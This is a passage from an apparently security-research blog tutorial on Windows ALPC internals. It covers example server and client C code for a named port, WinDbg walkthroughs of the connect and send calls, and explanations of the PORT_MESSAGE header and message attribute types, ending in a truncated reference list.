pmReceive;    NTSTATUS                ntRet;    BOOLEAN                 bBreak;    HANDLE                  hConnectedPort;    HANDLE                  hPort;    SIZE_T                  nLen;    LPVOID                  lpMem;    BYTE                    bTemp;      RtlInitUnicodeString(&amp;usPortName, PortName);    InitializeObjectAttributes(&amp;objPort, &amp;usPortName, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);    RtlSecureZeroMemory(&amp;serverPortAttr, <span class="hljs-keyword">sizeof</span>(serverPortAttr));    serverPortAttr.MaxMessageLength = MAX_MSG_LEN;    ntRet = NtAlpcCreatePort(&amp;hPort, &amp;objPort, &amp;serverPortAttr);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] NtAlpcCreatePort: 0x%X\n&quot;</span>, ntRet);    <span class="hljs-keyword">if</span> (!ntRet)    {        nLen = <span class="hljs-keyword">sizeof</span>(pmReceive);        ntRet = NtAlpcSendWaitReceivePort(hPort, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;pmReceive, &amp;nLen, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);        <span class="hljs-keyword">if</span> (!ntRet)        {            RtlSecureZeroMemory(&amp;pmRequest, <span class="hljs-keyword">sizeof</span>(pmRequest));            pmRequest.MessageId = pmReceive.MessageId;            pmRequest.u1.s1.DataLength = <span class="hljs-number">0x0</span>;            pmRequest.u1.s1.TotalLength = pmRequest.u1.s1.DataLength + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE);            ntRet = NtAlpcAcceptConnectPort(&amp;hConnectedPort, hPort, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;pmRequest, <span class="hljs-literal">NULL</span>, TRUE); <span class="hljs-comment">// 0</span>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] NtAlpcAcceptConnectPort: 0x%X\n&quot;</span>, ntRet);            <span class="hljs-keyword">if</span> (!ntRet)            {                bBreak = TRUE;                <span class="hljs-keyword">while</span> (bBreak)                {                    nLen = MAX_MSG_LEN;                    lpMem = AllocMsgMem(nLen);                    NtAlpcSendWaitReceivePort(hPort, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, (PPORT_MESSAGE)lpMem, &amp;nLen, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);                    pmReceive = *(PORT_MESSAGE*)lpMem;                    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>((BYTE*)lpMem + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE), <span class="hljs-string">&quot;exit\n&quot;</span>))                    {                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] Received &apos;exit&apos; command\n&quot;</span>);                        HeapFree(GetProcessHeap(), <span class="hljs-number">0</span>, lpMem);                        ntRet = NtAlpcDisconnectPort(hPort, <span class="hljs-number">0</span>);                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] NtAlpcDisconnectPort: %X\n&quot;</span>, ntRet);                        CloseHandle(hConnectedPort);                        CloseHandle(hPort);                        ExitThread(<span class="hljs-number">0</span>);                    }                    <span class="hljs-keyword">else</span>                    {                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] Received Data: &quot;</span>);                        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt;= pmReceive.u1.s1.DataLength; i++)                        {                            bTemp = *(BYTE*)((BYTE*)lpMem + i + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE));                            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%X &quot;</span>, bTemp);                        }                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);                        HeapFree(GetProcessHeap(), <span class="hljs-number">0</span>, lpMem);                    }                }            }        }    }    ExitThread(<span class="hljs-number">0</span>);}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{    HANDLE hThread;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] ALPC-Example Server\n&quot;</span>);    hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)&amp;CreatePortAndListen, <span class="hljs-string">L&quot;\\RPC Control\\HackyBoiz&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);    WaitForSingleObject(hThread, INFINITE);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Shuting down server\n&quot;</span>);    getchar();    <span class="hljs-keyword">return</span>;}</code></pre><blockquote><p>Client.c</p></blockquote><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;winternl.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;ntalpcapi.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;ntdll.lib&quot;</span>)</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MSG_LEN 0x100</span><span class="hljs-function">LPVOID <span class="hljs-title">CreateMsgMem</span><span class="hljs-params">(PPORT_MESSAGE PortMessage, SIZE_T MessageSize, LPVOID Message)</span></span><span class="hljs-function"></span>{    LPVOID lpMem = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MessageSize + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE));    memmove(lpMem, PortMessage, <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE));    memmove((BYTE*)lpMem + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE), Message, MessageSize);    <span class="hljs-keyword">return</span>(lpMem);}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{    UNICODE_STRING  usPort;    PORT_MESSAGE    pmSend;    PORT_MESSAGE    pmReceive;    NTSTATUS        ntRet;    BOOLEAN         bBreak;    SIZE_T          nLen;    HANDLE          hPort;    LPVOID          lpMem;     CHAR            szInput[MSG_LEN];    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ALPC-Example Client\n&quot;</span>);    RtlInitUnicodeString(&amp;usPort, <span class="hljs-string">L&quot;\\RPC Control\\HackyBoiz&quot;</span>);    RtlSecureZeroMemory(&amp;pmSend, <span class="hljs-keyword">sizeof</span>(pmSend));    pmSend.u1.s1.DataLength = MSG_LEN;    pmSend.u1.s1.TotalLength = pmSend.u1.s1.DataLength + <span class="hljs-keyword">sizeof</span>(pmSend);    lpMem = CreateMsgMem(&amp;pmSend, MSG_LEN, <span class="hljs-string">L&quot;Hello HackyBoiz!&quot;</span>);    ntRet = NtAlpcConnectPort(&amp;hPort, &amp;usPort, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] NtAlpcConnectPort: 0x%X\n&quot;</span>, ntRet);    <span class="hljs-keyword">if</span> (!ntRet)    {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] type &apos;exit&apos; to disconnect from the server\n&quot;</span>);        bBreak = TRUE;        <span class="hljs-keyword">while</span> (bBreak)        {            RtlSecureZeroMemory(&amp;pmSend, <span class="hljs-keyword">sizeof</span>(pmSend));            RtlSecureZeroMemory(&amp;szInput, <span class="hljs-keyword">sizeof</span>(szInput));            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[.] Enter Message &gt; &quot;</span>);            fgets(&amp;szInput, MSG_LEN, <span class="hljs-built_in">stdin</span>);            pmSend.u1.s1.DataLength = <span class="hljs-built_in">strlen</span>(szInput);            pmSend.u1.s1.TotalLength = pmSend.u1.s1.DataLength + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE);            lpMem = CreateMsgMem(&amp;pmSend, pmSend.u1.s1.DataLength, &amp;szInput);            ntRet = NtAlpcSendWaitReceivePort(hPort, <span class="hljs-number">0</span>, (PPORT_MESSAGE)lpMem, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] NtAlpcSendWaitReceivePort: 0x%X\n&quot;</span>, ntRet);            HeapFree(GetProcessHeap(), <span class="hljs-number">0</span>, lpMem);        }    }    getchar();    <span class="hljs-keyword">return</span>;}</code></pre><p>If you build and run Server.c, you can see that a server ALPC port is created under \RPC Control.</p><p><img src="image%206.png" alt="image.png"></p><p>Now let&#x2019;s debug the server side with WinDbg. First, take a look at NtAlpcCreatePort:</p><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">NtAlpcCreatePort</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    OUT PHANDLE PortHandle,</span></span><span class="hljs-function"><span class="hljs-params">    IN POBJECT_ATTRIBUTES ObjectAttributes,</span></span><span class="hljs-function"><span class="hljs-params">    IN OUT PALPC_INFO PortInformation OPTIONAL</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p><img src="image%207.png" alt="image.png"></p><p>After setting a breakpoint, you&#x2019;ll see that rdx points to the ObjectAttributes. We&#x2019;ll look at Attributes in more detail later, but inside this structure there is an ObjectName. The OBJECT_ATTRIBUTES structure looks like this:</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">OBJECT_ATTRIBUTES</span> {</span>    ULONG           Length;    HANDLE          RootDirectory;    PUNICODE_STRING ObjectName;   <span class="hljs-comment">// &#x2190; this one</span>    ULONG           Attributes;    PVOID           SecurityDescriptor;    PVOID           SecurityQualityOfService;} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;</code></pre><p>So rdx + 0x10 should be the ObjectName, right? If we inspect that:</p><p><img src="image%208.png" alt="image.png"></p><p>You can see that the port is created with the name \RPC Control\HackyBoiz!</p><p>Now let&#x2019;s switch to the client side and debug the communication with WinDbg.</p><p><img src="image%209.png" alt="image.png"></p><p>Once we run the client, the server accepts the connection, and the client can start sending messages. Let&#x2019;s look at that part in more detail.</p><p><img src="image%2010.png" alt="image.png"></p><p>First, we inspect the initial connection call to <code>NtAlpcConnectPort</code>:</p><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">NtAlpcConnectPort</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    OUT PHANDLE PortHandle,</span></span><span class="hljs-function"><span class="hljs-params">    IN PUNICODE_STRING PortName, <span class="hljs-comment">// &lt;- here</span></span></span><span class="hljs-function"><span class="hljs-params">    IN POBJECT_ATTRIBUTES ObjectAttributes,</span></span><span class="hljs-function"><span class="hljs-params">    IN PALPC_INFO PortInformation OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN DWORD ConnectionFlags,</span></span><span class="hljs-function"><span class="hljs-params">    IN PSID pSid OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PLPC_MESSAGE ConnectionMessage OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN OUT PULONG ConnectMessageSize OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PVOID InMessageBuffer OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PVOID OutMessageBuffer OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PLARGE_INTEGER Timeout OPTIONAL</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>rdx holds the PortName. If we dump that, we can confirm that it&#x2019;s pointing to the HackyBoiz port we set up on the server!</p><p>Once the Connect request is sent, the server decides whether to accept it or not.</p><p>Looking at the NtAlpcAcceptConnectPort call in Server.c:</p><pre><code class="hljs cpp">ntRet = NtAlpcAcceptConnectPort(    &amp;hConnectedPort,   <span class="hljs-comment">// OUT PHANDLE PortHandle  &#x2192; rcx</span>    hPort,     <span class="hljs-number">0</span>,    <span class="hljs-literal">NULL</span>,       <span class="hljs-literal">NULL</span>,       <span class="hljs-literal">NULL</span>,       &amp;pmRequest,         <span class="hljs-literal">NULL</span>,               TRUE              );</code></pre><p>The arguments are set up like this.</p><ul><li>rcx is the handle that the server will receive for the new communication port. After the syscall, you&#x2019;ll see that hConnectedPort now holds the actual ALPC server communication port handle.</li></ul><p>Since the last argument AcceptConnection is TRUE, the connection is accepted, and both sides can now exchange messages over this communication port!</p><h2 id="3-ALPC-Messaging"><a href="#3-ALPC-Messaging" class="headerlink" title="3. ALPC Messaging"></a>3. ALPC Messaging</h2><p>Now that we&#x2019;ve seen how ALPC connects, let&#x2019;s look at the actual message format going back and forth.</p><p>In ALPC, messages always have the following layout:</p><p><img src="image%2011.png" alt="image.png"></p><pre><code class="hljs cpp">[ PORT_MESSAGE ][ Payload(Data) ]</code></pre><p>The front is the fixed PORT_MESSAGE header, and after that comes the actual text/binary payload we want to send.</p><h3 id="3-1-PORT-MESSAGE-structure"><a href="#3-1-PORT-MESSAGE-structure" class="headerlink" title="3.1. PORT_MESSAGE structure"></a>3.1. PORT_MESSAGE structure</h3><p>The header structure looks like this:</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">PORT_MESSAGE</span></span><span class="hljs-class">{</span>    <span class="hljs-keyword">union</span> {        <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>            USHORT DataLength;   <span class="hljs-comment">// Actual payload length</span>            USHORT TotalLength;  <span class="hljs-comment">// Total size = PORT_MESSAGE + payload</span>        } s1;        ULONG Length;    } u1;    <span class="hljs-keyword">union</span> {        <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>            USHORT Type;             <span class="hljs-comment">// Message type</span>            USHORT DataInfoOffset;   <span class="hljs-comment">// Attribute area offset</span>        } s2;        ULONG ZeroInit;    } u2;    <span class="hljs-keyword">union</span> {        CLIENT_ID ClientId;          <span class="hljs-comment">// Sender process/thread ID</span>        <span class="hljs-keyword">double</span>    DoNotUseThisField; <span class="hljs-comment">// (alignment)</span>    };    ULONG MessageId;                 <span class="hljs-comment">// Message identifier</span>    <span class="hljs-keyword">union</span> {        SIZE_T ClientViewSize;       <span class="hljs-comment">// Section view size</span>        ULONG  CallbackId;           <span class="hljs-comment">// Callback ID</span>    };} PORT_MESSAGE, *PPORT_MESSAGE;</code></pre><p>In practice, we usually only care about around four fields:</p><ul><li><p>u1.s1.DataLength</p><p>  &#x2192; Length of the payload</p></li><li><p>u1.s1.TotalLength</p><p>  &#x2192; sizeof(PORT_MESSAGE) + DataLength</p><p>  &#x2192; Used by the kernel to know the total size of the message</p></li><li><p>ClientId</p><p>  &#x2192; Process and thread ID of the sender</p></li><li><p>MessageId / CallbackId</p><p>  &#x2192; Used to match requests and responses</p></li></ul><p>So the actual format is pretty straightforward.</p><p>If we look again at the example client code:</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MSG_LEN 0x100</span><span class="hljs-function">LPVOID <span class="hljs-title">CreateMsgMem</span><span class="hljs-params">(PPORT_MESSAGE PortMessage, SIZE_T MessageSize, LPVOID Message)</span></span><span class="hljs-function"></span><span class="hljs-function">    LPVOID lpMem </span>= HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MessageSize + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE));    memmove(lpMem, PortMessage, <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE));    memmove((BYTE*)lpMem + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE), Message, MessageSize);    <span class="hljs-keyword">return</span>(lpMem);}</code></pre><p>Here, lpMem is exactly:</p><pre><code class="hljs cpp">[ PORT_MESSAGE ][ Payload ]</code></pre><p>A fully-formed ALPC message buffer.</p><p>In main() we use it like this:</p><pre><code class="hljs cpp">RtlSecureZeroMemory(&amp;pmSend, <span class="hljs-keyword">sizeof</span>(pmSend));<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[.] Enter Message &gt; &quot;</span>);fgets(&amp;szInput, MSG_LEN, <span class="hljs-built_in">stdin</span>);pmSend.u1.s1.DataLength  = <span class="hljs-built_in">strlen</span>(szInput);pmSend.u1.s1.TotalLength = pmSend.u1.s1.DataLength + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE);lpMem = CreateMsgMem(&amp;pmSend, pmSend.u1.s1.DataLength, &amp;szInput);ntRet = NtAlpcSendWaitReceivePort(    hPort,                <span class="hljs-comment">// HANDLE PortHandle</span>    <span class="hljs-number">0</span>,                    <span class="hljs-comment">// ULONG Flags</span>    (PPORT_MESSAGE)lpMem, <span class="hljs-comment">// SendMessage</span>    <span class="hljs-literal">NULL</span>,                 <span class="hljs-comment">// SendMessageAttributes</span>    <span class="hljs-literal">NULL</span>,                 <span class="hljs-comment">// ReceiveMessage</span>    <span class="hljs-literal">NULL</span>,                 <span class="hljs-comment">// BufferLength</span>    <span class="hljs-literal">NULL</span>,                 <span class="hljs-comment">// ReceiveMessageAttributes</span>    <span class="hljs-literal">NULL</span>                  <span class="hljs-comment">// Timeout</span>);</code></pre><p>To summarize:</p><ol><li>We set DataLength and TotalLength inside pmSend.</li><li><p>CreateMsgMem() builds a single buffer lpMem with:</p><p> [ pmSend | user input string ]</p></li><li><p>We pass lpMem as SendMessage to NtAlpcSendWaitReceivePort.</p></li></ol><p>Of course, we should also look at how the message actually looks in memory during debugging.</p><p><img src="image%2012.png" alt="image.png"></p><p>Let&#x2019;s check what the buffer looks like when the client sends <strong>&#x201C;Hello HackyBoiz!&#x201D;</strong>.</p><pre><code class="hljs cpp">ntRet = NtAlpcSendWaitReceivePort(    hPort,          <span class="hljs-comment">// HANDLE PortHandle</span>    <span class="hljs-number">0</span>,              <span class="hljs-comment">// ULONG Flags</span>    (PPORT_MESSAGE)lpMem, <span class="hljs-comment">// SendMessage</span>    <span class="hljs-literal">NULL</span>,           <span class="hljs-comment">// SendMessageAttributes</span>    <span class="hljs-literal">NULL</span>,           <span class="hljs-comment">// ReceiveMessage</span>    <span class="hljs-literal">NULL</span>,           <span class="hljs-comment">// BufferLength</span>    <span class="hljs-literal">NULL</span>,           <span class="hljs-comment">// ReceiveMessageAttributes</span>    <span class="hljs-literal">NULL</span>            <span class="hljs-comment">// Timeout</span>);</code></pre><p>In our code, NtAlpcSendWaitReceivePort is called like this.</p><p>lpMem should contain the message we&#x2019;re sending. Let&#x2019;s inspect it!</p><p><img src="image%2013.png" alt="image.png"></p><p>r8 is the pointer to the full message buffer, and we can clearly see PORT_MESSAGE followed by &#x201C;Hello HackyBoiz!&#x201D;.</p><p>The first DWORD is 00390011 because:</p><ul><li>Lower 2 bytes = 0x0011 &#x2192; DataLength = 0x11 = 17 (string length)</li><li>Upper 2 bytes = 0x0039 &#x2192; TotalLength = 0x39 = 57 (PORT_MESSAGE + payload)</li></ul><p>This is the buffer that gets copied from user mode to kernel mode, then from the server&#x2019;s kernel-side buffer to the server&#x2019;s receive buffer.</p><h2 id="4-ALPC-Message-Attribute"><a href="#4-ALPC-Message-Attribute" class="headerlink" title="4. ALPC Message Attribute"></a>4. ALPC Message Attribute</h2><p>So far we&#x2019;ve looked at <strong>how to create ports, connect them, and send messages</strong>.</p><p>But if ALPC were only about sending messages, there&#x2019;d be no reason for it to be this complex.</p><p>The real reason ALPC is complicated is that, besides the message body, it can also attach various <strong>attributes</strong> to a message:</p><ul><li>Security context (impersonation)</li><li>Shared memory sections (views)</li><li>Handles (files, processes, sections, etc.)</li><li>Token information</li><li>User-defined context</li></ul><p>ALPC is basically a framework that lets you send all of this together in a single NtAlpcSendWaitReceivePort call.</p><h3 id="4-1-ALPC-Message-Attribute"><a href="#4-1-ALPC-Message-Attribute" class="headerlink" title="4.1. ALPC Message Attribute"></a>4.1. ALPC Message Attribute</h3><p>If we look again at the <code>NtAlpcSendWaitReceivePort()</code> signature, we see two extra parameters for attributes:</p><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS <span class="hljs-title">NtAlpcSendWaitReceivePort</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    HANDLE PortHandle,</span></span><span class="hljs-function"><span class="hljs-params">    DWORD Flags,</span></span><span class="hljs-function"><span class="hljs-params">    PPORT_MESSAGE SendMessage,</span></span><span class="hljs-function"><span class="hljs-params">    PALPC_MESSAGE_ATTRIBUTES SendMessageAttributes,    <span class="hljs-comment">// &#x2190; send-side attributes</span></span></span><span class="hljs-function"><span class="hljs-params">    PPORT_MESSAGE ReceiveMessage,</span></span><span class="hljs-function"><span class="hljs-params">    PSIZE_T BufferLength,</span></span><span class="hljs-function"><span class="hljs-params">    PALPC_MESSAGE_ATTRIBUTES ReceiveMessageAttributes, <span class="hljs-comment">// &#x2190; receive-side attributes</span></span></span><span class="hljs-function"><span class="hljs-params">    PLARGE_INTEGER Timeout</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><ul><li><p><code>SendMessageAttributes</code></p><p>  &#x2192; Attributes we want to attach when sending the message.</p></li><li><p><code>ReceiveMessageAttributes</code></p><p>  &#x2192; Attributes we want to receive along with the response.</p></li></ul><p>So you can think of it as a &#x201C;mutual agreement&#x201D; model for sending attributes.</p><p>At the beginning of the attribute buffer, there is a common header:</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">ALPC_MESSAGE_ATTRIBUTES</span> {</span>    ULONG AllocatedAttributes;  <span class="hljs-comment">// Which attribute types this buffer has space for</span>    ULONG ValidAttributes;      <span class="hljs-comment">// Which attributes are actually valid for this message</span>} ALPC_MESSAGE_ATTRIBUTES, *PALPC_MESSAGE_ATTRIBUTES;</code></pre><ul><li><p><code>AllocatedAttributes</code></p><p>  &#x2192; Bit flags indicating which attribute types this buffer can hold</p></li><li><p><code>ValidAttributes</code></p><p>  &#x2192; Which attributes are actually used for this specific message</p></li></ul><p>To paraphrase it:</p><pre><code class="hljs ini"><span class="hljs-attr">AllocatedAttributes</span> = &#x201C;This buffer can hold these attributes.&#x201D;<span class="hljs-attr">ValidAttributes</span> =  &#x201C;These are the <span class="hljs-literal">on</span>es we&#x2019;re actually using for this message.&#x201D;</code></pre><h3 id="4-2-Main-attribute-types"><a href="#4-2-Main-attribute-types" class="headerlink" title="4.2 Main attribute types"></a>4.2 Main attribute types</h3><p>There are several types of attributes, but let&#x2019;s look at the most important ones.</p><blockquote><p><strong>1. Security Attribute</strong></p></blockquote><p>This includes the sender&#x2019;s security context, which allows the receiver to impersonate the sender.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">ALPC_SECURITY_ATTR</span> {</span>    ULONG Flags;    PSECURITY_QUALITY_OF_SERVICE pQOS;    HANDLE ContextHandle;} ALPC_SECURITY_ATTR, *PALPC_SECURITY_ATTR;</code></pre><ul><li><code>pQOS</code><ul><li>Pointer to a <code>SECURITY_QUALITY_OF_SERVICE</code> structure</li><li>Controls what level of impersonation, context tracking, etc. is allowed</li></ul></li><li><code>ContextHandle</code><ul><li>Handle to a kernel-managed security context</li></ul></li></ul><hr><blockquote><p><strong>2. View Attribute (Data View Attribute)</strong></p></blockquote><p>Used to pass a shared memory section. This is how you bypass the normal 64KB message size limit.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">ALPC_DATA_VIEW_ATTR</span> {</span>    ULONG  Flags;    HANDLE SectionHandle;  <span class="hljs-comment">// Section handle attached to the ALPC port</span>    PVOID  ViewBase;       <span class="hljs-comment">// Base address where the section is mapped in this process</span>    SIZE_T ViewSize;       <span class="hljs-comment">// Size of the mapped view</span>} ALPC_DATA_VIEW_ATTR, *PALPC_DATA_VIEW_ATTR;</code></pre><ol><li>Create a shared section and configure a view using <code>NtAlpcCreatePortSection</code> / <code>NtAlpcCreateSectionView</code>.</li><li>Fill an <code>ALPC_DATA_VIEW_ATTR</code> with that information.</li><li>Attach it to the attribute buffer and send it along with the message.</li><li>The receiver maps the same section view in its own address space, effectively sharing memory.</li></ol><hr><blockquote><p><strong>3. Context Attribute</strong></p></blockquote><p>Used to attach user-defined context to a particular client or message.</p><p>The server can use this to track per-client state or per-message state.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">ALPC_CONTEXT_ATTR</span> {</span>    PVOID PortContext;     <span class="hljs-comment">// Context attached to this port (client)</span>    PVOID MessageContext;  <span class="hljs-comment">// Context attached to this specific message</span>    ULONG Sequence;        <span class="hljs-comment">// Sequence number</span>    ULONG MessageId;       <span class="hljs-comment">// Message ID</span>    ULONG CallbackId;      <span class="hljs-comment">// Callback ID</span>} ALPC_CONTEXT_ATTR, *PALPC_CONTEXT_ATTR;</code></pre><ul><li><code>PortContext</code><ul><li>A pointer to a structure the server associates with the client port (session ID, user info, etc.)</li></ul></li><li><code>MessageContext</code><ul><li>Used when you want separate context per message</li></ul></li><li><code>Sequence</code> / <code>MessageId</code> / <code>CallbackId</code><ul><li>Values set by the kernel</li><li>Help with structured message handling, similar to how TCP tracks state for requests/responses</li></ul></li></ul><hr><blockquote><p><strong>4. Handle Attribute</strong></p></blockquote><p>Used to pass object handles along with the message.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">ALPC_MESSAGE_HANDLE_INFORMATION</span> {</span>    ULONG Index;        <span class="hljs-comment">// Index in the attribute buffer</span>    ULONG Flags;    ULONG Handle;       <span class="hljs-comment">// Handle value (from the sender&#x2019;s perspective)</span>    ULONG ObjectType;   <span class="hljs-comment">// Object type</span>    ACCESS_MASK GrantedAccess; <span class="hljs-comment">// Access rights the receiver will get</span>} ALPC_MESSAGE_HANDLE_INFORMATION, *PALPC_MESSAGE_HANDLE_INFORMATION;</code></pre><ul><li>The kernel checks whether the handle is valid, whether the rights make sense, and whether cross-process duplication is allowed.</li><li>The receiver then uses this information to obtain a valid handle for the corresponding object in its own process.</li></ul><h2 id="Wrapping-Up"><a href="#Wrapping-Up" class="headerlink" title="Wrapping Up"></a>Wrapping Up</h2><p><img src="image%2014.png" alt="image.png"></p><p>So that&#x2019;s the basic flow of ALPC! On the surface it just looks like &#x201C;yet another IPC mechanism,&#x201D; but under the hood, a single call to <code>NtAlpcSendWaitReceivePort()</code> takes care of:</p><ul><li>Managing port objects</li><li>Handling the <code>PORT_MESSAGE</code> header</li><li>Parsing various attributes</li><li>Mapping section views, validating permissions, duplicating handles, etc.</li></ul><p>Because of this complexity, a lot of real-world vulnerabilities tend to appear in the logic that interprets and validates these attributes.</p><p>If I get the chance, I&#x2019;d love to write another post just focusing on ALPC-based vulnerabilities.</p><p>Thanks for reading this long post &#x2014; see you next time! &#x1F44B;</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><p><a href="https://ti.qianxin.com/blog/articles/the-tragedy-of-alpc-unknown-windows-privilege-escalation-nday-vulnerability-research-in-august-en/">https://ti.qianxin.com/blog/articles/the-tragedy-of-alpc-unknown-windows-privilege-escalation-nday-vulnerability-research-in-august-en/</a></p></li><li><p><a href="https://csandker.io/2022/05/24/Offensive-Windows-IPC-3-ALPC.html">https://csandker.io/2022/05/24/Offensive-Windows-IPC-3-ALPC.html</a></p></li><li><p><a href="https://csandker.io/2022/05/29/Debugging-And-Reversing-ALPC.html">https://csandker.io/2022/05/29/Debugging-And-Reversing-ALPC.html</a></p></li><li><p><a href="https://recon.cx/2008/a/thomas_garnier/LPC-ALPC-paper.pdf">https://recon.cx/2008/a/thomas_garnier/LPC-ALPC-paper.pdf</a></p></li><li><p><a href="https://theori.io/blog/chaining-n-days-to-compromise-all-part-2-windows-kernel-lpe-a-k-a-chrome-sandbox-escape">https://theori.io/blog/chaining-n-days-to-compromise-all-part-2-windows-kernel-lpe-a-k-a-chrome-sandbox-escape</a></p></li><li><p><a href="https://infocon.org/cons/SyScan/SyScan%202014%20Singapore/SyScan%202014%20presentations/SyScan2014_AlexIonescu_AllabouttheRPCLRPCALPCandLPCinyourPC.pdf">https://infocon.org/cons/SyScan/SyScan%202014%20Singapore/SyScan%202014%20presentations/SyScan2014_AlexIonescu_AllabouttheRPCLRPCALPCandLPCinyourPC.pdf</a></p></li><li><p><a href="https://en.wikipedia.org/wiki/Local_Inter-Process_Communication">https://en.wikipedia.org/wiki/Local_Inter-Process_Communication</a></p></li><li><p><a 